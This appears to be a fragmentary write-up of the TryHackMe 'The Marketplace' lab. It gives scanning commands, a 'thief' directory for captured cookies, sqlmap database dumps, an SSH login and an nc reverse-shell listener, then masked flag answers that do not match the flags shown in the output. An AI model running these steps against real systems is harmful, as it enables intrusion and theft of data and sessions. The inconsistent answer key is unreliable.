...
```
bibo318@parrot:~/CTFs/tryhackme/The Marketplace$ sudo nmap -A -sS -sC -sV -O 10.10.225.14
...
```
bibo318@parrot:~/CTFs/tryhackme/The Marketplace$ gobuster dir -u http://10.10.225.14 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
...
```
bibo318@parrot:~/CTFs/tryhackme/The Marketplace$ service apache2 start
bibo318@parrot:~/CTFs/tryhackme/The Marketplace$ cd /var/www/html/
bibo318@parrot:/var/www/html$ sudo mkdir thief
bibo318@parrot:/var/www/html$ cd thief/
bibo318@parrot:/var/www/html/thief$ ls
index.php
```

```
bibo318@parrot:/var/www/html/thief$ cat cookie.txt
...
```
bibo318@parrot:~/CTFs/tryhackme/The Marketplace$ sqlmap -r r.txt --technique=U --dbms=mysql --delay=3
        ___
       __H__
...
```
bibo318@parrot:~/CTFs/tryhackme/The Marketplace$ sqlmap -r r.txt --current-db
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.9#stable}
|_ -| . [,]     | .'| . |
...
```
bibo318@parrot:~/CTFs/tryhackme/The Marketplace$ sqlmap -r r.txt -D marketplace --dump
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.9#stable}
|_ -| . [,]     | .'| . |
...
```
bibo318@parrot:~/CTFs/tryhackme/The Marketplace$ ssh jake@10.10.225.14
...
THM{V0N318*****c3648ee7af1369676e3e4b15da6dc0b4}
```
...
```
bibo318@parrot:~/CTFs/tryhackme/The Marketplace$ nc -lnvp 9001
...
THM{V0N318*****d4f76179c80c0dcf46e0f8e43c9abd62}
```

1. What is flag 1?

`THM{V0N318*****c37a63895910e478f28669b048c348d512**123:))}`

2. What is flag 2? (User.txt)

`THM{V0N318*****c3648ee7af1369676e3e4b15da6dc0b412**123:))}`

3. What is flag 3? (Root.txt)

`THM{V0N318*****d4f76179c80c0dcf46e0f8e43c9abd6212**123:))}`
